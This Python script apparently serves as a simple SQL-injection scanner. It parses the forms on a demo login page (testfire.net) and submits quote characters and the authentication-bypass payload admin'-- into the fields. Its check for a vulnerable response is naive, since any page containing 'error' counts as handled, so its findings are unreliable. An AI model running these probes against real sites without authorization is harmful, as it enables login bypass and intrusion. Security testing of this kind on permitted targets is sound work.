import requests
from bs4 import BeautifulSoup
import sys
from urllib.parse import urljoin
from urllib.parse import urlparse 

s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0"
global reportstring 
reportstring = "Report"

def get_forms(url):
    soup = BeautifulSoup(s.get(url).content,"html.parser")
    return soup.find_all("form")

def form_details(form):
    detailsOfForm = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method")
    inputs = []

    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value" ,"")
        inputs.append({
            "type": input_type,
            "name": input_name,
            "value": input_value,
        })
    
    detailsOfForm['action'] = action
    detailsOfForm['method'] = method 
    detailsOfForm['inputs'] = inputs
    #print(method)
    return detailsOfForm

def vulnerable(response):
    #errors= { "error" , 
     #       " quoted string not properly terminated" , 
      #      "unclosed quotation mark after the charachter string",
       #     "you have an error in your SQL Syntax"}
    responsestr = response.content.decode().lower()
    #print(responsestr)
    #print(responsestr.find("login failed") )
    if ((responsestr.find("syntax error") > -1) or (responsestr.find("login failed") > -1) or (responsestr.find("error") >-1 )):
        return True
    else:
        return False 

def SQL_injection_scanhypen(url):
    forms= get_forms(url)
    #print(f"[+] Detected {len(forms)} forms on {url}.")
    
    for form in forms:
        details = form_details(form)
        if (len(details["inputs"]) >2 ):
            for i in "\"'":
                data = {}
                for input_tag in details["inputs"]:
                    if input_tag["type"] == "hidden" or input_tag["type"] == "text":
                        data[input_tag['name']] = f'varsha"'
                    elif input_tag["type"] == "password":
                        data[input_tag['name']]= f'password"'
                    

            #print(url)
            #form_details(form)
            #print (data)
            #targeturl = url
            targeturl = urljoin(url , details["action"])
            #print( targeturl)
            if details["method"]== "post":
                res = s.post(targeturl, data = data)
            elif details["method"]=="get":
                res = s.get(targeturl, params = data)
            #print(res.content.decode().lower())
            if vulnerable(res):
                #print("no SQL injection attack vulnerability detected", targeturl)
                return "\nPassing quotes in the input fields is handled by the website in login form"
            else:                
                #print("SQL injection attack vulnerability in link:",targeturl)
                return "\nPassing quotes in the input fields is not handled by the website in login form"
                break   
  

def SQL_injection_scanadmin(url ):
    forms= get_forms(url)
    #print(f"[+] Detected {len(forms)} forms on {url}.")

    for form in forms:
        details = form_details(form)
        if (len(details["inputs"]) >2 ):
            for i in "\"'":
                data = {}
                for input_tag in details["inputs"]:
                    if input_tag["type"] == "hidden" or input_tag["value"]:
                        data[input_tag['name']] = "admin'--"
                    elif input_tag["type"] != "submit":
                        data[input_tag['name']]= "admin'--"

                #print("Admin")
                #form_details(form)
                #print (data)
                targeturl = url
                targeturl = urljoin(url ,  details["action"])
                #print( targeturl)
                if details["method"]== "post":
                    res = s.post(targeturl, data = data)
                elif details["method"]=="get":
                    res = s.get(targeturl, params = data)
                #print(res)
                if vulnerable(res):
                    #print("no SQL injection attack vulnerability detected", targeturl)
                    return "\n Passing admin'-- in the input fields is handled by the website in login form"
                else:                
                   # print("SQL injection attack vulnerability in link:",targeturl)
                    return "\n Passing admin'-- in the input fields is not handled by the website in login form"
                    break

if __name__ == "__main__":
    urlToBeChecked = "http://testfire.net/login.jsp"
    reportstring = "Final Report of vulnerability checking site  " + urlToBeChecked 
    reportstring += "\n"
    reportstring += SQL_injection_scanhypen(urlToBeChecked)
    reportstring += SQL_injection_scanadmin(urlToBeChecked)
    reportstring += "\n"
    print(reportstring)
 